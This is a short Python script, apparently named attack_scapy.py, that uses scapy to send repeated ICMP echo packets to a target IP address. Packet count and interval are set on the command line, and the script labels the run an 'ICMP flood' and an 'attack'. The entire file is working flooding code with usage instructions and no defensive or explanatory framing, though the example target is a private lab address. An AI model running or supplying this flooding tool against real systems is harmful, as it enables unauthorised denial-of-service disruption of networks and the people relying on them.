from scapy.all import IP, ICMP, send
import sys
import time

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 attack_scapy.py <target_ip> <count> <interval>")
        print("Example: python3 attack_scapy.py 10.0.0.2 50 0.05")
        sys.exit(1)

    target_ip = sys.argv[1]
    count = int(sys.argv[2])
    interval = float(sys.argv[3])

    print(f"Starting ICMP flood to {target_ip} with {count} packets every {interval} sec")

    pkt = IP(dst=target_ip) / ICMP()

    for i in range(count):
        send(pkt, verbose=False)
        print(f"Sent packet {i+1}/{count}")
        time.sleep(interval)

    print("Attack finished.")

if __name__ == "__main__":
    main()
